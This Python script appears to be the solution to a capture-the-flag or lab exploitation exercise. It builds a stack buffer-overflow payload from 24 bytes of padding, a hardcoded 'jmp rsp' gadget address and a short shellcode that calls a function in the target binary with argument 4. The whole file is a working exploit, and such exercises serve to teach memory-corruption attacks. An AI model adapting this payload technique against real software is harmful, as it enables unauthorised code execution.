import sys
import struct

jmp_rsp = 0x401e0b

shellcode = b'\x6a\x04\x5f\x68\x88\x1a\x40\x00\xc3'

payload  = b'A' * 24
payload += struct.pack('<Q', jmp_rsp)
payload += shellcode
payload += b'\n'

sys.stdout.buffer.write(payload)